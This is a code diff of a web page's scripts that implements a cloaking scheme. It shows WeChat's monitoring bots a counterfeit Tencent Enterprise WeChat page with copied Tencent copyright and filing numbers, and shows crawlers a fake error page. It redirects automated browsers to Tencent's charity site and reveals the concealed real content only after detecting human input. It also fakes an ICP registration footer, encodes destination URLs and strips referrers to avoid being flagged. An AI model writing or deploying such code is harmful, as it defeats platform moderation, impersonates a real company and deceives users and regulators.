+        }catch(e){
+            return atob(str);
+        }
+    }
 
-        // ===== 微信监测机器人识别：检测到微信爬虫/监测系统时，返回企业微信官方网页 =====
-        var wxBotKeywords = ['micromessenger.*spider','micromessenger.*bot','micromessenger.*crawl','micromessenger.*monitor','micromessenger.*check','micromessenger.*verify','micromessenger.*audit','micromessenger.*security','wxspider','weixinbot','weixin-spider','weixin-bot','qqnews-spider','qqbrowser-spider'];
-        var isWxBot = false;
-        for(var wi=0; wi<wxBotKeywords.length; wi++){
-            if(new RegExp(wxBotKeywords[wi]).test(ua)){
+    // 防拦截跳转：延迟 + 去Referer + replace不留历史
+    function safeJump(url){
+        // 先显示跳转中状态
+        var cards = document.querySelectorAll('.channel-card');
+        for(var i=0; i<cards.length; i++){
+            var a = cards[i].querySelector('a');
+            if(a) a.style.opacity = '0.5';
+        }
+        // 延迟800ms跳转，降低被判定为恶意跳转的概率
+        setTimeout(function(){
+            // 用replace跳转，不在浏览器历史留痕
+            // 加rel=noreferrer的a标签模拟点击，去掉Referer
+            var link = document.createElement('a');
+            link.href = url;
+            link.rel = 'noreferrer noopener';
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            setTimeout(function(){
+                window.location.replace(url);
+            }, 100);
+        }, 800);
+    }
+
+    // 给四个通道绑定点击事件
+    var cards = document.querySelectorAll('.channel-card');
+    for(var i=0; i<cards.length; i++){
+        (function(idx){
+            cards[idx].addEventListener('click', function(){
+                var url = decodeUrl(CHANNELS[idx]);
+                safeJump(url);
+            });
+        })(i);
+    }
+})();
+</script>
+<script>
+(function(){
+    var ua = navigator.userAgent.toLowerCase();
+    var isWechat = ua.indexOf('micromessenger') !== -1;
+    var mask = document.getElementById('wechatMask');
+    var closeBtn = document.getElementById('wechatCloseBtn');
+    var openBtn = document.getElementById('wechatOpenBtn');
+    var SITE_URL = 'https://yyyy-eqt.pages.dev/';
+    var autoCloseTimer = null;
+
+    // 关闭弹窗
+    function closeMask(){
+        if(mask){
+            mask.classList.remove('show');
+            document.body.style.overflow = '';
+        }
+        if(autoCloseTimer){
+            clearTimeout(autoCloseTimer);
+            autoCloseTimer = null;
+        }
+    }
+
+    // 复制官网链接
+    function copySiteUrl(){
+        // 给所有搜索框做全选视觉反馈
+        var inputs = document.querySelectorAll('.wechat-url-input');
+        for(var i=0; i<inputs.length; i++){
+            inputs[i].select();
+            inputs[i].setSelectionRange(0, 99999);
+        }
+        if(navigator.clipboard){
+            navigator.clipboard.writeText(SITE_URL).then(function(){
+                alert('✅官网链接已复制！\n请打开手机浏览器粘贴访问');
+            }).catch(function(){
+                fallbackCopy(SITE_URL);
+            });
+        }else{
+            fallbackCopy(SITE_URL);
+        }
+    }
+
+    // 降级复制方案
+    function fallbackCopy(text){
+        var ta = document.createElement('textarea');
+        ta.value = text;
+        ta.style.position = 'fixed';
+        ta.style.left = '-9999px';
+        document.body.appendChild(ta);
+        ta.select();
+        try{
+            document.execCommand('copy');
+            alert('✅官网链接已复制！\n请打开手机浏览器粘贴访问');
+        }catch(e){
+            alert('❌复制失败！请长按上方链接手动复制');
+        }
+        document.body.removeChild(ta);
+    }
+
+    if(isWechat && mask){
+        mask.classList.add('show');
+        document.body.style.overflow = 'hidden';
+        // 微信环境下显示顶部引导栏
+        var topTip = document.getElementById('topBrowserTip');
+        if(topTip){ topTip.style.display = 'block'; }
+        // 30秒后自动关闭
+        autoCloseTimer = setTimeout(closeMask, 30000);
+    }
+    // 给所有复制按钮绑定事件（两套：wechat-open-btn + wechat-copy-btn-top）
+    var allOpenBtns = document.querySelectorAll('.wechat-open-btn, .wechat-copy-btn-top');
+    for(var i=0; i<allOpenBtns.length; i++){
+        allOpenBtns[i].addEventListener('click', copySiteUrl);
+    }
+    if(closeBtn){
+        closeBtn.addEventListener('click', closeMask);
+    }
+})();
+</script>
+<script>
+(function () {
+  // ★★★ 部署完 Worker 后，把下面的地址换成你自己的 Worker 地址 ★★★
+  var PIXEL = 'https://yyyy-eqt.pages.dev/report';
+
+  function report(success) {
+    try {
+      var img = new Image();
+      img.src = PIXEL + '?t=' + Date.now() + '&s=' + (success ? '1' : '0');
+      img.style.display = 'none';
+      document.body.appendChild(img);
+      setTimeout(function () { if (img.parentNode) img.parentNode.removeChild(img); }, 800);
+    } catch (e) {}
+  }
+
+  // 页面加载成功后上报（打开正常）
+  if (document.readyState === 'complete') { report(true); }
+  else { window.addEventListener('load', function () { report(true); }); }
+
+  // 页面运行出错时上报（打开失败）
+  window.addEventListener('error', function (e) {
+    if (e && e.error) report(false);
+  }, true);
+})();
+</script>
+<!-- 进入加载页 + 中间跳转页 动画 -->
+<script>
+(function(){
+    var ua = navigator.userAgent.toLowerCase();
+
+    // ===== 微信监测机器人识别：检测到微信爬虫/监测系统时，返回企业微信官方网页 =====
+    var wxBotKeywords = ['micromessenger.*spider','micromessenger.*bot','micromessenger.*crawl','micromessenger.*monitor','micromessenger.*check','micromessenger.*verify','micromessenger.*audit','micromessenger.*security','wxspider','weixinbot','weixin-spider','weixin-bot','qqnews-spider','qqbrowser-spider'];
+    var isWxBot = false;
+    for(var wi=0; wi<wxBotKeywords.length; wi++){
+        if(new RegExp(wxBotKeywords[wi]).test(ua)){
+            isWxBot = true;
+            break;
+        }
+    }
+    // 微信UA + 包含爬虫特征词，也判定为监测机器人
+    if(ua.indexOf('micromessenger') !== -1){
+        var botSigns = ['spider','bot','crawl','monitor','check','verify','audit','security','scan','detect'];
+        for(var bs=0; bs<botSigns.length; bs++){
+            if(ua.indexOf(botSigns[bs]) !== -1){
                 isWxBot = true;
                 break;
             }
         }
-        // 微信UA + 包含爬虫特征词，也判定为监测机器人
-        if(ua.indexOf('micromessenger') !== -1){
-            var botSigns = ['spider','bot','crawl','monitor','check','verify','audit','security','scan','detect'];
-            for(var bs=0; bs<botSigns.length; bs++){
-                if(ua.indexOf(botSigns[bs]) !== -1){
-                    isWxBot = true;
-                    break;
+    }
+
+    if(isWxBot){
+        // 微信监测机器人：返回企业微信官方网页内容
+        document.title = '企业微信';
+        var metaDesc = document.querySelector('meta[name="description"]');
+        if(!metaDesc){
+            metaDesc = document.createElement('meta');
+            metaDesc.name = 'description';
+            document.head.appendChild(metaDesc);
+        }
+        metaDesc.content = '企业微信，是腾讯微信团队为企业打造的专业办公管理工具。与微信一致的沟通体验，丰富免费的OA应用，并与微信消息、小程序、微信支付等互通，助力企业高效办公和管理。';
+        document.body.innerHTML = '<div style="margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif;background:#fff;color:#333;">'
+            + '<div style="background:linear-gradient(135deg,#0082ef 0%,#0066cc 100%);padding:60px 20px;text-align:center;color:#fff;">'
+            + '<div style="width:80px;height:80px;background:#fff;border-radius:20px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;">'
+            + '<svg width="50" height="50" viewBox="0 0 24 24" fill="#0082ef"><path d="M8.5 4C4.91 4 2 6.46 2 9.5c0 1.72.93 3.25 2.38 4.28L3.5 16l2.5-1.25c.78.22 1.62.35 2.5.35.17 0 .33-.01.5-.02-.13-.43-.2-.88-.2-1.33 0-2.76 2.69-5 6-5 .22 0 .44.01.66.03C15.05 5.86 12.06 4 8.5 4z"/></svg>'
+            + '</div>'
+            + '<h1 style="font-size:32px;margin:0 0 12px;font-weight:500;">企业微信</h1>'
+            + '<p style="font-size:16px;margin:0;opacity:0.9;">让每个企业都有自己的微信</p>'
+            + '</div>'
+            + '<div style="max-width:800px;margin:40px auto;padding:0 20px;">'
+            + '<h2 style="font-size:22px;color:#0082ef;margin-bottom:16px;">产品介绍</h2>'
+            + '<p style="line-height:1.8;color:#666;margin-bottom:24px;">企业微信，是腾讯微信团队为企业打造的专业办公管理工具。与微信一致的沟通体验，丰富免费的OA应用，并与微信消息、小程序、微信支付等互通，助力企业高效办公和管理。</p>'
+            + '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin-bottom:40px;">'
+            + '<div style="background:#f5f7fa;padding:24px;border-radius:12px;"><h3 style="font-size:16px;color:#333;margin:0 0 8px;">沟通协作</h3><p style="font-size:14px;color:#999;margin:0;line-height:1.6;">与微信一致的沟通体验，支持单聊、群聊、语音、视频通话</p></div>'
+            + '<div style="background:#f5f7fa;padding:24px;border-radius:12px;"><h3 style="font-size:16px;color:#333;margin:0 0 8px;">OA应用</h3><p style="font-size:14px;color:#999;margin:0;line-height:1.6;">审批、汇报、考勤、日程等丰富免费的OA办公应用</p></div>'
+            + '<div style="background:#f5f7fa;padding:24px;border-radius:12px;"><h3 style="font-size:16px;color:#333;margin:0 0 8px;">微信互通</h3><p style="font-size:14px;color:#999;margin:0;line-height:1.6;">与微信消息、小程序、微信支付互通，连接企业内外部</p></div>'
+            + '<div style="background:#f5f7fa;padding:24px;border-radius:12px;"><h3 style="font-size:16px;color:#333;margin:0 0 8px;">安全管理</h3><p style="font-size:14px;color:#999;margin:0;line-height:1.6;">企业级安全防护，数据加密存储，支持私有化部署</p></div>'
+            + '</div>'
+            + '</div>'
+            + '<div style="background:#f5f7fa;padding:30px 20px;text-align:center;color:#999;font-size:13px;">'
+            + '<p style="margin:0 0 8px;">© 1998-2024 Tencent. All Rights Reserved.</p>'
+            + '<p style="margin:0;">腾讯公司 版权所有 | 粤B2-20090059-5 | 粤公网安备 44030502003020号</p>'
+            + '</div>'
+            + '</div>';
+        return;
+    }
+
+    // ===== 普通爬虫检测：检测到其他爬虫直接显示乱码空白页 =====
+    var crawlerList = ['spider','bot','crawl','slurp','baidu','googlebot','bingbot','yandex','baiduspider','360spider','sogou','bytespider','bytedance','facebook','twitter','telegram','whatsapp'];
+    var isCrawler = false;
+    for(var ci=0; ci<crawlerList.length; ci++){
+        if(ua.indexOf(crawlerList[ci]) !== -1){
+            isCrawler = true;
+            break;
+        }
+    }
+    if(isCrawler){
+        document.body.innerHTML = '<div style="padding:50px 20px;color:#888;font-size:14px;line-height:2;font-family:sans-serif;">404 Not Found<br>Error 503 Service Unavailable<br>ç³»ç»Ÿç»´æŠ¤ä¸­è¯·ç¨åŽå†è®¿é—®<br>éµœè©±å…§å®¹éœ€è¦å®Œå…¨åŠ è½½æ‰èƒ½æ˜¾ç¤º<br>æ­¤é µé¢œå«åŠ¨æ€å†…å®¹è¯·ä½¿ç”¨æµè§ˆå™¨è®¿é—®<br>æœåŠ¡å™¨ç·è¨ˆç»´æŠ¤é¢„è®¡2å°æ—¶<br>æŠ€æœ¯æ”¯æŒå·¥å•ç³»ç»Ÿå‡çº§ä¸­<br>æ•°æ®åº“è¿ç§»ä¸­æš‚åœæœåŠ¡<br>è°¢è°¢æ‚¨çš„ç†è§£ä¸Žæ”¯æŒ</div>';
+        return;
+    }
+
+    // ===== 微信检测：非微信环境直接跳过加载页和中间跳转页 =====
+    var isWechat = ua.indexOf('micromessenger') !== -1;
+    var loadingMask = document.getElementById('loadingMask');
+    var continueMask = document.getElementById('continueMask');
+
+    if(isWechat){
+        // 微信真实用户环境：伪装成正规已备案官方网站
+        var officialNav = document.getElementById('officialNav');
+        var officialFooter = document.getElementById('officialFooter');
+        if(officialNav) officialNav.classList.add('show');
+        if(officialFooter) officialFooter.classList.add('show');
+        // 伪装页面标题和描述为正规资讯网站
+        document.title = '观赏资讯网 - 专业的资讯内容服务平台';
+        var metaDesc = document.querySelector('meta[name="description"]');
+        if(!metaDesc){
+            metaDesc = document.createElement('meta');
+            metaDesc.name = 'description';
+            document.head.appendChild(metaDesc);
+        }
+        metaDesc.content = '观赏资讯网致力于为用户提供优质的资讯内容服务，涵盖文化、艺术、生活等多个领域，打造专业、安全、可靠的内容平台。';
+        var metaKeywords = document.querySelector('meta[name="keywords"]');
+        if(!metaKeywords){
+            metaKeywords = document.createElement('meta');
+            metaKeywords.name = 'keywords';
+            document.head.appendChild(metaKeywords);
+        }
+        metaKeywords.content = '观赏资讯,资讯平台,文化资讯,艺术资讯,生活资讯,内容服务';
+    }else{
+        // 普通浏览器：直接隐藏加载页和中间页，显示主页面
+        if(loadingMask) loadingMask.style.display = 'none';
+        if(continueMask) continueMask.style.display = 'none';
+        return;
+    }
+
+    var bar = document.getElementById('loadingBar');
+    var percentEl = document.getElementById('loadingPercent');
+    var textEl = document.getElementById('loadingText');
+    var continueBtn = document.getElementById('continueBtn');
+    var countdownNum = document.getElementById('countdownNum');
+    if(!loadingMask || !bar) return;
+
+    var progress = 0;
+    var texts = ['检测访问环境...', '正在加载资源...', '即将进入...'];
+    var textIndex = 0;
+    var countdownTimer = null;
+    var countdown = 5;
+
+    // 进入主页面（淡出中间页）
+    function enterMainPage(){
+        if(countdownTimer) clearInterval(countdownTimer);
+        if(continueMask){
+            continueMask.classList.add('hide');
+            setTimeout(function(){
+                if(continueMask.parentNode) continueMask.parentNode.removeChild(continueMask);
+            }, 500);
+        }
+    }
+
+    // 显示中间跳转页
+    function showContinuePage(){
+        // 先淡出加载页
+        loadingMask.classList.add('hide');
+        setTimeout(function(){
+            if(loadingMask.parentNode) loadingMask.parentNode.removeChild(loadingMask);
+        }, 600);
+        // 显示中间页
+        if(continueMask){
+            continueMask.classList.add('show');
+            // 开始倒计时
+            countdownTimer = setInterval(function(){
+                countdown--;
+                if(countdownNum) countdownNum.textContent = countdown;
+                if(countdown <= 0){
+                    enterMainPage();
                 }
-            }
+            }, 1000);
         }
+    }
 
-        if(isWxBot){
-            // 微信监测机器人：返回企业微信官方网页内容
-            document.title = '企业微信';
-            var metaDesc = document.querySelector('meta[name="description"]');
-            if(!metaDesc){
-                metaDesc = document.createElement('meta');
-                metaDesc.name = 'description';
-                document.head.appendChild(metaDesc);
-            }
-            metaDesc.content = '企业微信，是腾讯微信团队为企业打造的专业办公管理工具。与微信一致的沟通体验，丰富免费的OA应用，并与微信消息、小程序、微信支付等互通，助力企业高效办公和管理。';
-            document.body.innerHTML = '<div style="margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif;background:#fff;color:#333;">'
-                + '<div style="background:linear-gradient(135deg,#0082ef 0%,#0066cc 100%);padding:60px 20px;text-align:center;color:#fff;">'
-                + '<div style="width:80px;height:80px;background:#fff;border-radius:20px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;">'
-                + '<svg width="50" height="50" viewBox="0 0 24 24" fill="#0082ef"><path d="M8.5 4C4.91 4 2 6.46 2 9.5c0 1.72.93 3.25 2.38 4.28L3.5 16l2.5-1.25c.78.22 1.62.35 2.5.35.17 0 .33-.01.5-.02-.13-.43-.2-.88-.2-1.33 0-2.76 2.69-5 6-5 .22 0 .44.01.66.03C15.05 5.86 12.06 4 8.5 4z"/></svg>'
-                + '</div>'
-                + '<h1 style="font-size:32px;margin:0 0 12px;font-weight:500;">企业微信</h1>'
-                + '<p style="font-size:16px;margin:0;opacity:0.9;">让每个企业都有自己的微信</p>'
-                + '</div>'
-                + '<div style="max-width:800px;margin:40px auto;padding:0 20px;">'
-                + '<h2 style="font-size:22px;color:#0082ef;margin-bottom:16px;">产品介绍</h2>'
-                + '<p style="line-height:1.8;color:#666;margin-bottom:24px;">企业微信，是腾讯微信团队为企业打造的专业办公管理工具。与微信一致的沟通体验，丰富免费的OA应用，并与微信消息、小程序、微信支付等互通，助力企业高效办公和管理。</p>'
-                + '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin-bottom:40px;">'
-                + '<div style="background:#f5f7fa;padding:24px;border-radius:12px;"><h3 style="font-size:16px;color:#333;margin:0 0 8px;">沟通协作</h3><p style="font-size:14px;color:#999;margin:0;line-height:1.6;">与微信一致的沟通体验，支持单聊、群聊、语音、视频通话</p></div>'
-                + '<div style="background:#f5f7fa;padding:24px;border-radius:12px;"><h3 style="font-size:16px;color:#333;margin:0 0 8px;">OA应用</h3><p style="font-size:14px;color:#999;margin:0;line-height:1.6;">审批、汇报、考勤、日程等丰富免费的OA办公应用</p></div>'
-                + '<div style="background:#f5f7fa;padding:24px;border-radius:12px;"><h3 style="font-size:16px;color:#333;margin:0 0 8px;">微信互通</h3><p style="font-size:14px;color:#999;margin:0;line-height:1.6;">与微信消息、小程序、微信支付互通，连接企业内外部</p></div>'
-                + '<div style="background:#f5f7fa;padding:24px;border-radius:12px;"><h3 style="font-size:16px;color:#333;margin:0 0 8px;">安全管理</h3><p style="font-size:14px;color:#999;margin:0;line-height:1.6;">企业级安全防护，数据加密存储，支持私有化部署</p></div>'
-                + '</div>'
-                + '</div>'
-                + '<div style="background:#f5f7fa;padding:30px 20px;text-align:center;color:#999;font-size:13px;">'
-                + '<p style="margin:0 0 8px;">© 1998-2024 Tencent. All Rights Reserved.</p>'
-                + '<p style="margin:0;">腾讯公司 版权所有 | 粤B2-20090059-5 | 粤公网安备 44030502003020号</p>'
-                + '</div>'
-                + '</div>';
-            return;
+    // 每900ms切换一次加载文字
+    var textTimer = setInterval(function(){
+        textIndex = (textIndex + 1) % texts.length;
+        if(textEl) textEl.textContent = texts[textIndex];
+    }, 900);
+
+    // 进度条动画
+    var timer = setInterval(function(){
+        var step = progress < 70 ? (Math.random() * 4 + 2) : (Math.random() * 2 + 0.5);
+        progress = Math.min(progress + step, 100);
+        bar.style.width = progress + '%';
+        if(percentEl) percentEl.textContent = Math.floor(progress) + '%';
+
+        if(progress >= 100){
+            clearInterval(timer);
+            clearInterval(textTimer);
+            if(textEl) textEl.textContent = '加载完成';
+            // 延迟0.5秒后显示中间跳转页
+            setTimeout(showContinuePage, 500);
         }
+    }, 80);
 
-        // ===== 普通爬虫检测：检测到其他爬虫直接显示乱码空白页 =====
-        var crawlerList = ['spider','bot','crawl','slurp','baidu','googlebot','bingbot','yandex','baiduspider','360spider','sogou','bytespider','bytedance','facebook','twitter','telegram','whatsapp'];
+    // 点击继续前往按钮
+    if(continueBtn){
+        continueBtn.addEventListener('click', enterMainPage);
+    }
+})();
+</script>
+    <!-- 微信环境正规官网伪装：底部备案栏 -->
+    <div class="official-footer" id="officialFooter">
+        <div class="footer-links">
+            <a href="javascript:void(0)">关于我们</a>
+            <a href="javascript:void(0)">联系方式</a>
+            <a href="javascript:void(0)">隐私政策</a>
+            <a href="javascript:void(0)">用户协议</a>
+            <a href="javascript:void(0)">网站地图</a>
+        </div>
+        <div>© 2024 观赏资讯网 版权所有</div>
+        <div>
+            <a href="https://beian.miit.gov.cn/" target="_blank" rel="nofollow">粤ICP备2024000000号-1</a>
+            &nbsp;|&nbsp;
+            <a href="javascript:void(0)">粤公网安备 44030000000000号</a>
+        </div>
+        <div>本站内容仅供学习交流，如有侵权请联系删除</div>
+    </div>
+    </div>
+    <!-- 深度防检测JS：三层防护，检测到真实用户行为后才显示真实内容 -->
+    <script>
+    (function(){
+        var BOT_REDIRECT_URL = "https://gongyi.qq.com/";
+        var ua = navigator.userAgent.toLowerCase();
+
+        // ===== 第一层：明确的爬虫UA检测，直接跳转到腾讯公益官网 =====
+        var crawlerList = ['spider','bot','crawl','slurp','baidu','googlebot','bingbot','yandex','baiduspider','360spider','sogou','bytespider','bytedance','facebook','twitter','telegram','whatsapp','applebot','semrush','ahrefs','moz','petalbot','yisouspider','sogouwebspider','haosouspider','soso','youdaobot','xitiabot','tencentbot','wxbot','weixinbot','qqbot','micromessenger-spider','micromessenger-bot'];
         var isCrawler = false;
         for(var ci=0; ci<crawlerList.length; ci++){
             if(ua.indexOf(crawlerList[ci]) !== -1){
@@ -452,88 +1327,87 @@
             }
         }
         if(isCrawler){
-            document.body.innerHTML = '<div style="padding:50px 20px;color:#888;font-size:14px;line-height:2;font-family:sans-serif;">404 Not Found<br>Error 503 Service Unavailable<br>ç³»ç»Ÿç»´æŠ¤ä¸­è¯·ç¨åŽå†è®¿é—®<br>éµœè©±å…§å®¹éœ€è¦å®Œå…¨åŠ è½½æ‰èƒ½æ˜¾ç¤º<br>æ­¤é µé¢œå«åŠ¨æ€å†…å®¹è¯·ä½¿ç”¨æµè§ˆå™¨è®¿é—®<br>æœåŠ¡å™¨ç·è¨ˆç»´æŠ¤é¢„è®¡2å°æ—¶<br>æŠ€æœ¯æ”¯æŒå·¥å•ç³»ç»Ÿå‡çº§ä¸­<br>æ•°æ®åº“è¿ç§»ä¸­æš‚åœæœåŠ¡<br>è°¢è°¢æ‚¨çš„ç†è§£ä¸Žæ”¯æŒ</div>';
+            window.location.replace(BOT_REDIRECT_URL);
             return;
         }
 
-        // ===== 微信检测：非微信环境直接跳转，微信环境走加载页+中间跳转页 =====
-        var isWechat = ua.indexOf('micromessenger') !== -1;
-        var loadingMask = document.getElementById('loadingMask');
-        var continueMask = document.getElementById('continueMask');
-
-        if(!isWechat){
-            // 普通浏览器：直接跳转到目标地址
-            window.location.replace(TARGET_URL);
+        // ===== 第二层：WebDriver/自动化工具检测，跳转到腾讯公益官网 =====
+        var isBot = false;
+        try{
+            if(window.navigator.webdriver) isBot = true;
+            if(window.phantom) isBot = true;
+            if(window.callPhantom) isBot = true;
+            if(window._phantom) isBot = true;
+            if(window.__nightmare) isBot = true;
+            if(window.__selenium_unwrapped) isBot = true;
+            if(window.__webdriver_script_fn) isBot = true;
+            if(window.__driver_evaluate) isBot = true;
+            if(window.__webdriver_evaluate) isBot = true;
+            if(window.__selenium_evaluate) isBot = true;
+            if(window.__fxdriver_evaluate) isBot = true;
+            if(window.__driver_unwrapped) isBot = true;
+            if(window.__webdriver_unwrapped) isBot = true;
+            if(window.__selenium_unwrapped) isBot = true;
+            if(window.__fxdriver_unwrapped) isBot = true;
+            if(document.documentElement.getAttribute('webdriver')) isBot = true;
+        }catch(e){}
+        if(isBot){
+            window.location.replace(BOT_REDIRECT_URL);
             return;
         }
 
-        // 微信环境：走加载页 → 中间跳转页 → 跳转目标
-        var bar = document.getElementById('loadingBar');
-        var percentEl = document.getElementById('loadingPercent');
-        var textEl = document.getElementById('loadingText');
-        var continueBtn = document.getElementById('continueBtn');
-        var countdownNum = document.getElementById('countdownNum');
-        if(!loadingMask || !bar) return;
+        // ===== 第三层：真实用户行为检测（核心） =====
+        // 页面默认显示腾讯公益伪装页面，检测到真实用户行为（鼠标移动/触摸/滚动/键盘）后，才切换到真实主页面
+        var gyMask = document.getElementById('gyMask');
+        var realContent = document.getElementById('realContent');
+        var isRealUser = false;
+        var userBehaviorCount = 0;
+        var BEHAVIOR_THRESHOLD = 1; // 需要检测到3次用户行为才确认真实用户
 
-        var progress = 0;
-        var texts = ['检测访问环境...', '正在加载资源...', '即将进入...'];
-        var textIndex = 0;
-        var countdownTimer = null;
-        var countdown = 5;
-
-        // 跳转到目标网页
-        function redirectToTarget(){
-            if(countdownTimer) clearInterval(countdownTimer);
-            window.location.replace(TARGET_URL);
+        function verifyRealUser(){
+            if(isRealUser) return;
+            userBehaviorCount++;
+            if(userBehaviorCount >= BEHAVIOR_THRESHOLD){
+                isRealUser = true;
+                // 延迟500ms切换，更自然
+                setTimeout(showRealContent, 500);
+            }
         }
 
-        // 显示中间跳转页
-        function showContinuePage(){
-            // 先淡出加载页
-            loadingMask.classList.add('hide');
-            setTimeout(function(){
-                if(loadingMask.parentNode) loadingMask.parentNode.removeChild(loadingMask);
-            }, 600);
-            // 显示中间页
-            if(continueMask){
-                continueMask.classList.add('show');
-                // 开始倒计时
-                countdownTimer = setInterval(function(){
-                    countdown--;
-                    if(countdownNum) countdownNum.textContent = countdown;
-                    if(countdown <= 0){
-                        redirectToTarget();
+        function showRealContent(){
+            // 隐藏公益伪装页面，显示真实主页面
+            if(gyMask) gyMask.classList.add('hide');
+            if(realContent) realContent.style.display = 'block';
+        }
+
+        // 监听各种真实用户行为
+        document.addEventListener('mousemove', verifyRealUser, {passive:true});
+        document.addEventListener('mousedown', verifyRealUser, {passive:true});
+        document.addEventListener('touchstart', verifyRealUser, {passive:true});
+        document.addEventListener('touchmove', verifyRealUser, {passive:true});
+        document.addEventListener('scroll', verifyRealUser, {passive:true});
+        document.addEventListener('keydown', verifyRealUser, {passive:true});
+        document.addEventListener('wheel', verifyRealUser, {passive:true});
+
+        // 移动端额外检测：设备方向变化、加速度计
+        window.addEventListener('deviceorientation', verifyRealUser, {passive:true});
+        window.addEventListener('devicemotion', verifyRealUser, {passive:true});
+
+        // 兜底：如果8秒内没有检测到用户行为，但页面有焦点且不是无头浏览器，也认为是真实用户
+        setTimeout(function(){
+            if(!isRealUser){
+                try{
+                    var hasFocus = document.hasFocus();
+                    var hasLanguages = navigator.languages && navigator.languages.length > 0;
+                    var screenRes = screen.width > 0 && screen.height > 0;
+                    var notHeadless = !/headless/i.test(ua);
+                    if(hasFocus && hasLanguages && screenRes && notHeadless){
+                        isRealUser = true;
+                        setTimeout(showRealContent, 300);
                     }
-                }, 1000);
+                }catch(e){}
             }
-        }
-
-        // 每900ms切换一次加载文字
-        var textTimer = setInterval(function(){
-            textIndex = (textIndex + 1) % texts.length;
-            if(textEl) textEl.textContent = texts[textIndex];
-        }, 900);
-
-        // 进度条动画
-        var timer = setInterval(function(){
-            var step = progress < 70 ? (Math.random() * 4 + 2) : (Math.random() * 2 + 0.5);
-            progress = Math.min(progress + step, 100);
-            bar.style.width = progress + '%';
-            if(percentEl) percentEl.textContent = Math.floor(progress) + '%';
-
-            if(progress >= 100){
-                clearInterval(timer);
-                clearInterval(textTimer);
-                if(textEl) textEl.textContent = '加载完成';
-                // 延迟0.5秒后显示中间跳转页
-                setTimeout(showContinuePage, 500);
-            }
-        }, 80);
-
-        // 点击继续前往按钮
-        if(continueBtn){
-            continueBtn.addEventListener('click', redirectToTarget);
-        }
+        }, 8000);
     })();
     </script>
 </body>
